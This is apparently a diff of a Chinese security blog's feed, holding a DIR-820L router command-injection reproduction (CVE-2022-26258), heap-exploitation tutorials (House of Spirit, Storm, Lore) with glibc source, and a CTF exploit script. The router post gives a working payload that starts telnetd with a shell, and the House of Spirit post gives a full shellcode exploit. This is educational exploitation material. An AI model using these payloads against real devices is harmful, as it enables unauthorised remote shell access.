-<p>进一步审计发现 copyDataToDataModelFormat是返回paramStr的也就是说 最后是提交给了get_set.ccp</p>
-<p><img src="/pic/CVE-2022-26258/3.png" alt="img"></p>
-<p>我们用grep -r “get_set.cpp”是查不到相关信息的，既然没有“get_set.ccp”文件，那么可能是这个URL会交给后端处理，处理好之后返回给用户结果。</p>
-<p><img src="/pic/CVE-2022-26258/4.png" alt="img"></p>
-<p>我们通过grep -r “get_set”发现这四个二进制文件中有调用于是我们进一步更进 去分析这四个二进制文件</p>
-<p>然后我们再去看一下开机自启文件包括哪些</p>
-<p><img src="/pic/CVE-2022-26258/5.png" alt="img"></p>
-<p>可以看到开机自启了ncc2和bulkListen</p>
-<p>所以可见正确答案是ncc2的位置，因为有get_set字符串和相对应的函数</p>
-<p><img src="/pic/CVE-2022-26258/6.png" alt="img"></p>
-<p>先对ncc2进行一个简单的分析</p>
-<p><img src="/pic/CVE-2022-26258/7.png" alt="img"></p>
-<p>这里先是对fork子进程的一个检测来判断ncc2是否启动，然后对信号量进行一系列的设置然后设置信号处理函数 再通过ncc_load_hw_cfg设置pin码(这里介绍一下 PIN码（Personal Identification Number, 个人识别号码）是一种为了安全目的而设计的数字代码，通常用于验证用户的身份) 在后面就是一些其他服务的配置部分了</p>
-<p>然后进一步分析 敏感函数 由于是命令执行我们去审system函数的代码</p>
-<p><img src="/pic/CVE-2022-26258/8.png" alt="img"></p>
-<p>这些都不存在命令任意执行漏洞，我们发现还有一个_system函数，想要快速的找到漏洞点就需要根据另一个线索点(Device Name)进行寻找。我们在搜索字符串时如果直接指定DeviceName还是比较难找到的，这里可以先简单搜索Device，然后搜索Name，寻找交叉点</p>
-<p><img src="/pic/CVE-2022-26258/9.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/10.png" alt="img"></p>
-<p>然后定位到sub_4F6DFC函数</p>
-<p><img src="/pic/CVE-2022-26258/11.png" alt="img"></p>
-<p>有两条路径一个利用下面的_system另一个是利用上面的_system</p>
-<p>先分析第一条路径：</p>
-<p>关键是看a2是否可控：</p>
-<p><img src="/pic/CVE-2022-26258/12.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/13.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/14.png" alt="img"></p>
-<p>发现不可控 此路不通0……….0</p>
-<p>第二条路径：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Obj = (const char **)getObj(0x60u, (int)v9);</span><br><span class="line">v4 = Obj;</span><br></pre></td></tr></tbody></table></figure>
-
-<p>v4是<code>getObj</code>函数的返回值Obj，需要绕过<code>hasInjectionString</code>的判断才能到达命令注入点，现在需要找到<code>hasInjectionString</code> 函数在哪个文件中，同样使用<code>grep -r</code> 命令：</p>
-<p><img src="/pic/CVE-2022-26258/15.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/16.png" alt="img"></p>
-<p>这里就是一些简单的过滤 没有过滤冒号和换行符，可以使用“\n”来绕过</p>
-<p>这里就可以通过修改参数来进行命令执行了</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR820L /home/luyouqi/模拟/Dir-820/DIR820LA1_FW105B03.bin</span><br></pre></td></tr></tbody></table></figure>
-
-<p>用FIRMAE进行环境直接模拟</p>
-<p><img src="/pic/CVE-2022-26258/17.png" alt="img"></p>
-<p>模拟好之后是这样 访问后</p>
-<p><img src="/pic/CVE-2022-26258/18.png" alt="img"></p>
-<p>默认密码是空直接登录就可 必须要登录这是验证后的命令执行漏洞</p>
-<p><img src="/pic/CVE-2022-26258/19.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/20.png" alt="img"></p>
-<p>修改红框参数为 %0atelnetd  -l /bin/sh%0a</p>
-<p>这里要注意直接在原包上进行修改 而不是放入重放后修改再发送，原因是会认定发送了多次导致崩溃 无法执行，发送后在等十秒就可以了</p>
-<p><img src="/pic/CVE-2022-26258/21.png" alt="img"></p>
-<p>再用telnet进行连接 就可以成功拿到shell</p>
-<p><img src="/pic/CVE-2022-26258/22.png" alt="img"></p>
-<h2 id="额外挖掘"><a href="#额外挖掘" class="headerlink" title="额外挖掘"></a>额外挖掘</h2><p>额外漏洞查找，一般漏洞存在就意味着肯定不只一个 我们继续去查询可能涉及到http_post且是需要执行的语句</p>
-<p><img src="/pic/CVE-2022-26258/23.png" alt="img"></p>
-<p>可以看到这个界面也是post指令传入 那我们就跟进tools_vct.asp查看</p>
-<p><img src="/pic/CVE-2022-26258/24.png" alt="img"></p>
-<p>传入的是ping.cpp</p>
-<p>通过前面的过程 查询发现可能还是在ncc2中 继续审代码发现</p>
-<p><img src="/pic/CVE-2022-26258/25.png" alt="img"></p>
-<p>是不是非常熟悉基本和前面那个洞没区别了</p>
-<p><img src="/pic/CVE-2022-26258/26.png" alt="img"></p>
-<p>然后发送 之后连接看看能否拿到shell</p>
-<p><img src="/pic/CVE-2022-26258/27.png" alt="img"></p>
-<p>成功了！！！！ </p>
-<p>刚准备去交cnvd的 结果一查</p>
-<p><img src="/pic/CVE-2022-26258/28.png" alt="img"></p>
-<p>得 白高兴一场 早被打了</p>
-<p>参考文献：<a href="https://cn-sec.com/archives/1262036.html">https://cn-sec.com/archives/1262036.html</a></p>
-]]></content>
-      <categories>
-        <category>iot</category>
-        <category>漏洞复现</category>
-        <category>dir</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现---命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house-of-Spirit</title>
-    <url>/2024/08/15/house%20of%20spirit/</url>
-    <content><![CDATA[<h2 id="House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。"><a href="#House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。" class="headerlink" title="House of Spirit 是 the Malloc Maleficarum 中的一种技术。"></a>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</h2><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
-<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
-<ul>
-<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
-<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
-<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
-<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
-<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
-</ul>
-<h3 id="我们通过原理去分析-这些检测的绕过的代码原理"><a href="#我们通过原理去分析-这些检测的绕过的代码原理" class="headerlink" title="我们通过原理去分析 这些检测的绕过的代码原理"></a>我们通过原理去分析 这些检测的绕过的代码原理</h3><h3 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h3><p>因为fake_chunk可以在任意可写位置构造，这里对齐指的是地址上的对齐而不仅仅是内存对齐，比如32位程序的话fake_chunk的prev_size所在地址就应该位<code>0xXXXX0</code>或<code>0xXXXX4</code>。64位的话地址就应该在<code>0xXXXX0</code>或<code>0xXXXX8</code></p>
-<h3 id="fake-chunk-的-ISMMAP"><a href="#fake-chunk-的-ISMMAP" class="headerlink" title="fake chunk 的 ISMMAP"></a>fake chunk 的 ISMMAP</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#if HAVE_MMAP   </span><br><span class="line">    if (chunk_is_mmapped(p))       /* release mmapped memory. */</span><br><span class="line">    {     /* see if the dynamic brk/mmap threshold needs adjusting */</span><br><span class="line">        if (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold         </span><br><span class="line">            &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)       </span><br><span class="line">        {         </span><br><span class="line">            mp_.mmap_threshold = chunksize (p);</span><br><span class="line">            mp_.trim_threshold = 2 * mp_.mmap_threshold;       </span><br><span class="line">        }     </span><br><span class="line">        munmap_chunk(p);     </span><br><span class="line">    return;   </span><br><span class="line">    }</span><br><span class="line"> #endi</span><br></pre></td></tr></tbody></table></figure>
-
-<p>可以看到， MMAP 位需要置 0 ，否则 free 会，调用 munmap_chunk() 函数 unmap 本 chunk ，达不到进入 fastbin 的目的。</p>
-<h2 id="fake-chunk-的-size"><a href="#fake-chunk-的-size" class="headerlink" title="fake chunk 的 size"></a>fake chunk 的 size</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (*fb != NULL</span><br><span class="line">    &amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, 0))               </span><br><span class="line">    {         </span><br><span class="line">        errstr = "invalid fastbin entry (free)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
-
-<p> fake chunk 的 size 大小 需要满足对应的 fastbin 的 index ，同时也得对齐。</p>
-<h2 id="fake-chunk-的-next-chunk"><a href="#fake-chunk-的-next-chunk" class="headerlink" title="fake chunk 的 next chunk"></a>fake chunk 的 next chunk</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))&gt;= av-&gt;system_mem, 0))       </span><br><span class="line">    { </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">    /* We might not have a lock at this point and concurrent modifications</span><br><span class="line">       of system_mem might have let to a false positive.  Redo the test</span><br><span class="line">       after getting the lock.  */</span><br><span class="line">    if (have_lock</span><br><span class="line">        || ({ assert (locked == 0);</span><br><span class="line">              mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">              locked = 1;</span><br><span class="line">              chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ                     </span><br><span class="line">              || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;               </span><br><span class="line">            })) </span><br><span class="line">#endif           </span><br><span class="line">            {             </span><br><span class="line">                errstr = "free(): invalid next size (fast)";             </span><br><span class="line">                goto errout;           </span><br><span class="line">            } </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">            if (! have_lock)           </span><br><span class="line">                {             </span><br><span class="line">                    (void)mutex_unlock(&amp;av-&gt;mutex);             </span><br><span class="line">                    locked = 0;           </span><br><span class="line">                } </span><br><span class="line">#endif       </span><br><span class="line">    } </span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="fake-chunk-对应的-fastbin-链表头部"><a href="#fake-chunk-对应的-fastbin-链表头部" class="headerlink" title="fake chunk 对应的 fastbin 链表头部"></a>fake chunk 对应的 fastbin 链表头部</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (*fb == p, 0))       </span><br><span class="line">    {         </span><br><span class="line">        errstr = "double free or corruption (fasttop)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    } </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+    <title>house-of-storm</title>
+    <url>/2024/08/15/house%20of%20storm/</url>
+    <content><![CDATA[<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>House Of Storm 结合了 unsortedbin attack 和 Largebin attack 的攻击技术，其基本原理和 Largebin attack 类似，可以达到任意地址写的效果,感觉就是在原有的unsorted bin attack的过程加上了一个large bin attack攻击去修改size使得 unsorted bin 可以成功返回</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.glibc版本小于2.30,因为2.30之后加入了检查，unsorted bin attack无法使用<br>2.需要攻击者在largebin和unsorted_bin中分别布置一个chunk 这两个chunk需要在归位之后处于同一个largebin的index中,且unsortedbin中的chunk要比largebin中的大<br>3.需要unsorted_bin中的bk指针可控<br>4.需要largebin中的bk指针和bk_nextsize指针可控</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>这里引用了Rookle师傅对于源码的注释</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line">//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunk</span><br><span class="line">while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) </span><br><span class="line">{</span><br><span class="line">    bck = victim-&gt;bk;//取出unsorted的尾部的chunk</span><br><span class="line">    /*</span><br><span class="line">        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，</span><br><span class="line">        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。</span><br><span class="line">        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size </span><br><span class="line">        中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在 </span><br><span class="line">        unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接 </span><br><span class="line">        victim-&gt;size 没有问题。</span><br><span class="line">    */</span><br><span class="line">    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">        malloc_printerr(check_action, "malloc(): memory corruption",</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line"></span><br><span class="line">    size = chunksize(victim);//获取victim的size</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且</span><br><span class="line">        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上</span><br><span class="line">        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。</span><br><span class="line"></span><br><span class="line">        last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，</span><br><span class="line">        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分</span><br><span class="line">        形成一个 chunk，last_remainder 就是 指向的这个 chunk。</span><br><span class="line">    */</span><br><span class="line">    if (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) {</span><br><span class="line"></span><br><span class="line">        //分割remainder</span><br><span class="line">        remainder_size = size - nb;//计算分割后剩下的size</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);//获取remainder的地址</span><br><span class="line">        //把remainder加入unsorted bin中</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零</span><br><span class="line">        if (!in_smallbin_range(remainder_size)) {</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">        }</span><br><span class="line">        //设置victim的size</span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        //设置remainder的size</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        //设置remainder的物理相邻的下一个chunk的prev_size</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);//默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//将chunk指针转化为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //把victim从unsorted bin 中移除</span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    //如果 victim 的size 与申请的size相等，那么就返回其。</span><br><span class="line">    if (size == nb) {</span><br><span class="line">        //设置victim物理相邻的下一个chunk的prev_inuse位</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位</span><br><span class="line">        if (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA; </span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb); // 默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//把chunk转换为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中</span><br><span class="line">    //如果在smallbin的范围,则放到对应多small bin中</span><br><span class="line">    if (in_smallbin_range(size)) </span><br><span class="line">    {</span><br><span class="line">        victim_index = smallbin_index(size);//获取size对应的smallbin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头</span><br><span class="line">        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    }</span><br><span class="line">    else//如果不再smallbin的范围，也就是说在large bin 的范围</span><br><span class="line">    {</span><br><span class="line">        victim_index = largebin_index(size);//获取size对应的large bin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头</span><br><span class="line">        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk</span><br><span class="line"></span><br><span class="line">        //如果large bin 非空，在largbin进行按顺序插入</span><br><span class="line">        if (fwd != bck) {</span><br><span class="line">            /* Or with inuse bit to speed comparisons */</span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">            /*</span><br><span class="line">                large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span><br><span class="line">                的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span><br><span class="line">                加入到此large bin尾部。</span><br><span class="line">            */</span><br><span class="line">            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) {</span><br><span class="line"></span><br><span class="line">                fwd = bck;</span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                /*</span><br><span class="line">                large bin 中size最小的chunk的fd_nextsize会指向size最大的</span><br><span class="line">                那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span><br><span class="line">                chunk的bk_nextsize会指向size最小的那个chunk。</span><br><span class="line">                victim的bk_nextsize指向large bin原来最小的chunk，它的</span><br><span class="line">                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span><br><span class="line">                把它fd_nextsize和bk_nextsize都修正。</span><br><span class="line">                */</span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            } </span><br><span class="line">            else //如果victim不是large bin 中最小的chunk</span><br><span class="line">            {</span><br><span class="line">                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">                //从大到小（从头到尾）找到合适的位置</span><br><span class="line">                while ((unsigned long) size &lt; fwd-&gt;size) {</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">                }</span><br><span class="line">                //如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span><br><span class="line">                if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                else </span><br><span class="line">                {</span><br><span class="line">                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                }</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            }</span><br><span class="line">        } </span><br><span class="line">        else //如果large bin 为空，将victim加入到纵向列表</span><br><span class="line">            victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="line">    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空</span><br><span class="line">    //把victim加入到large bin的链表中</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 
 
-<h2 id="例题-I-ctf-pwn200"><a href="#例题-I-ctf-pwn200" class="headerlink" title="例题 I ctf pwn200"></a>例题 I ctf pwn200</h2><h3 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路:"></a>核心思路:</h3><p>通过house of spirit 进行fake chunk的伪造在栈上布置fake chunk 然后劫持程序流 走ret2shellcode</p>
-<h3 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h3><p><img src="/pic/house_of_spirit/0.png" alt="img"></p>
-<p>通过静态分析我们可以了解基本思路，接下来我们通过动态调试去看看</p>
-<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('1') 错误 改为52</span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>特别注意</strong> 这里的id不能输入小2*minsize的值 因为是作为下一个chunk的size 位 要满足check的条件 不然就会报错</p>
-<p>看一下我们输入的值和泄露的地址的布局</p>
-<p><img src="/pic/house_of_spirit/1.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br></pre></td></tr></tbody></table></figure>
-
-<p>进行覆盖修改ptr和fake chunk的伪造</p>
-<p><img src="/pic/house_of_spirit/2.png" alt="img"></p>
-<p>然后我们把这个fake_chunk free 再add回来劫持控制流</p>
-<p><img src="/pic/house_of_spirit/3.png" alt="img"></p>
-<p><img src="/pic/house_of_spirit/4.png" alt="img"></p>
-<p>成功shell</p>
-<p><img src="/pic/house_of_spirit/5.png" alt="img"></p>
-<p>exp如下:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./pwn200"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">dbg()</span><br><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('52')</span><br><span class="line">pause()</span><br><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br><span class="line">pause()</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"2")</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"1")</span><br><span class="line">rl("how long?\n")</span><br><span class="line">sl(str(0x30))</span><br><span class="line">rl("give me more money : \n")</span><br><span class="line">payload=p64(0)*3+p64(stack_addr-0x50)</span><br><span class="line">mx.send(payload)</span><br><span class="line"># payload</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-        <category>堆利用</category>
-      </categories>
-      <tags>
-        <tag>house_of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house-of-lore</title>
-    <url>/2024/08/15/house%20of%20lore/</url>
-    <content><![CDATA[<h2 id="使用版本以及影响"><a href="#使用版本以及影响" class="headerlink" title="使用版本以及影响"></a>使用版本以及影响</h2><p>2.23-2.31(不包含2.31)</p>
-<p><strong>libc-2.23</strong></p>
-<p><strong>libc-2.27</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></tbody></table></figure>
-
-<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
-<p><strong>libc-2.31</strong>（House Of Lore 被ban）</p>
-<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>house of lore是通过small bin机制，去进行任意地址的chunk 分配</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
-<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
-</ul>
-<h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><p>在_int_malloc libc2.23版本的3405的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (in_smallbin_range (nb))</span><br><span class="line">   {</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     if ((victim = last (bin)) != bin)</span><br><span class="line">       {</span><br><span class="line">         if (victim == 0) /* initialization check */</span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         else</span><br><span class="line">           {</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               {</span><br><span class="line">                 errstr = "malloc(): smallbin double linked list corrupted";</span><br><span class="line">                 goto errout;</span><br><span class="line">               }</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             